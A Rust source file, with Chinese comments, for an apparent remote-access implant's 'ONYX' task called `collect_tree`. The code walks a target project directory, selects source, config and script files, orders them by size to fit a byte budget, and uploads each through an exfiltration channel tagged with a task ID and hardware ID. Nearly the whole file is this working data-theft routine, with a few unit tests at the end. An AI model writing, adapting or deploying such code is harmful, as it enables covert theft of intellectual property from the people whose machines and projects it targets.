// ONYX: 源码批量回传（任务类型 `collect_tree`）
//
// collect_src 只出清单，这个才是真正把源码拉回来：遍历项目目录，
// 挑出源码文件逐个分块上传（复用 onyx_upload 的通道）。
//
// params: {"path":"D:\\proj","max_files":200,"max_file_bytes":1048576,
//          "max_total_bytes":20971520,"exts":[".rs",".c"]}
use hbb_common::log;
use serde_json::{json, Value};
use std::path::{Path, PathBuf};

const DEFAULT_MAX_FILES: usize = 200;
const DEFAULT_MAX_FILE_BYTES: u64 = 1024 * 1024;
const DEFAULT_MAX_TOTAL_BYTES: u64 = 20 * 1024 * 1024;
const MAX_DEPTH: usize = 8;

/// 默认只收代码/配置/文本，二进制一律跳过
const DEFAULT_EXTS: &[&str] = &[
    ".rs", ".c", ".h", ".hpp", ".cpp", ".cc", ".cxx", ".cs", ".java", ".kt", ".py", ".go", ".php",
    ".js", ".ts", ".jsx", ".tsx", ".vue", ".lua", ".rb", ".swift", ".m", ".mm", ".asm", ".s", "",
    ".toml", ".json", ".yaml", ".yml", ".xml", ".ini", ".cfg", ".conf", ".md", ".txt", ".sql",
    ".sh", ".bat", ".ps1", ".cmake", ".gradle", ".sln", ".vcxproj", ".csproj", ".pro", ".lock",
];

const SKIP_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "target",
    "bin",
    "obj",
    "dist",
    "build",
    ".vs",
    ".idea",
    "__pycache__",
    "venv",
    ".venv",
    ".next",
    ".nuxt",
    "vendor",
    "packages",
];

fn wanted(name: &str, exts: &[String]) -> bool {
    let lower = name.to_lowercase();
    if lower.ends_with(".pdb") || lower.ends_with(".exe") || lower.ends_with(".dll") {
        return false;
    }
    exts.iter().any(|e| {
        if e.is_empty() {
            !lower.contains('.') // 无扩展名文件（Makefile、Dockerfile 之类）
        } else {
            lower.ends_with(e.as_str())
        }
    })
}

pub fn collect(params: &[u8], task_id: &str, hwid: &str) -> String {
    let v: Value = serde_json::from_slice(params).unwrap_or(Value::Null);
    let root = v.get("path").and_then(|x| x.as_str()).unwrap_or("").trim();
    if root.is_empty() || !Path::new(root).is_dir() {
        return json!({"ok": false, "error": "path 不存在或不是目录"}).to_string();
    }
    let max_files = v
        .get("max_files")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_MAX_FILES as u64)
        .clamp(1, 2000) as usize;
    let max_file_bytes = v
        .get("max_file_bytes")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_MAX_FILE_BYTES)
        .clamp(1024, 16 * 1024 * 1024);
    let max_total = v
        .get("max_total_bytes")
        .and_then(|x| x.as_u64())
        .unwrap_or(DEFAULT_MAX_TOTAL_BYTES)
        .clamp(1024, 128 * 1024 * 1024);
    let exts: Vec<String> = match v.get("exts").and_then(|x| x.as_array()) {
        Some(arr) => arr
            .iter()
            .filter_map(|x| x.as_str().map(|s| s.to_lowercase()))
            .collect(),
        None => DEFAULT_EXTS.iter().map(|s| (*s).to_owned()).collect(),
    };

    let root_path = PathBuf::from(root);

    // 第一遍：只收集候选，不传。按大小升序传，同样的字节预算能覆盖更多文件
    // （源码目录里通常一堆小文件 + 少数大文件，先传小的信息量更大）。
    let mut candidates: Vec<(u64, PathBuf, String)> = Vec::new();
    let mut queue: Vec<(PathBuf, usize)> = vec![(root_path.clone(), 0)];
    let mut skipped = 0usize;
    while let Some((dir, depth)) = queue.pop() {
        if candidates.len() >= 20000 {
            break;
        }
        if depth > MAX_DEPTH {
            continue;
        }
        let entries = match std::fs::read_dir(&dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for e in entries.flatten() {
            let p = e.path();
            let name = e.file_name().to_string_lossy().to_string();
            if p.is_dir() {
                let lower = name.to_lowercase();
                if lower.starts_with('.') || SKIP_DIRS.iter().any(|s| *s == lower) {
                    continue;
                }
                queue.push((p, depth + 1));
                continue;
            }
            if !wanted(&name, &exts) {
                skipped += 1;
                continue;
            }
            let size = match std::fs::metadata(&p) {
                Ok(m) if m.is_file() => m.len(),
                _ => continue,
            };
            if size > max_file_bytes {
                skipped += 1;
                continue;
            }
            let rel = p
                .strip_prefix(&root_path)
                .unwrap_or(&p)
                .to_string_lossy()
                .replace('\\', "/");
            candidates.push((size, p, rel));
        }
    }
    candidates.sort_by_key(|(size, _, _)| *size);

    let mut uploaded: Vec<Value> = Vec::new();
    let mut failed: Vec<Value> = Vec::new();
    let mut total_bytes: u64 = 0;
    for (size, p, rel) in candidates {
        if uploaded.len() >= max_files || total_bytes >= max_total {
            break;
        }
        if total_bytes + size > max_total {
            skipped += 1;
            continue;
        }
        match crate::onyx_upload::send_with_key(
            &p.to_string_lossy(),
            max_file_bytes,
            task_id,
            hwid,
            &rel,
        ) {
            Ok((bytes, sha)) => {
                total_bytes += bytes;
                uploaded.push(json!({"rel": rel, "bytes": bytes, "sha256": sha}));
            }
            Err(err) => {
                if failed.len() < 20 {
                    failed.push(json!({"rel": rel, "error": err}));
                }
            }
        }
    }

    log::warn!(
        "[ONYX] collect_tree 完成 {} 个文件 {} 字节（跳过 {}）",
        uploaded.len(),
        total_bytes,
        skipped
    );

    json!({
        "ok": !uploaded.is_empty(),
        "root": root,
        "files": uploaded.len(),
        "bytes": total_bytes,
        "skipped": skipped,
        "failed": failed,
        "list": uploaded,
    })
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extension_filter() {
        let exts: Vec<String> = DEFAULT_EXTS.iter().map(|s| (*s).to_owned()).collect();
        assert!(wanted("main.rs", &exts));
        assert!(wanted("Cargo.toml", &exts));
        assert!(!wanted("game.exe", &exts));
        assert!(!wanted("lib.dll", &exts));
        assert!(!wanted("dump.pdb", &exts));
        assert!(!wanted("movie.mp4", &exts));
    }

    #[test]
    fn missing_root_rejected() {
        let out = collect(br#"{"path":"C:\\definitely\\missing\\dir"}"#, "tk", "hw");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], false);
    }

    #[test]
    fn empty_path_rejected() {
        let out = collect(br#"{}"#, "tk", "hw");
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["ok"], false);
    }
}
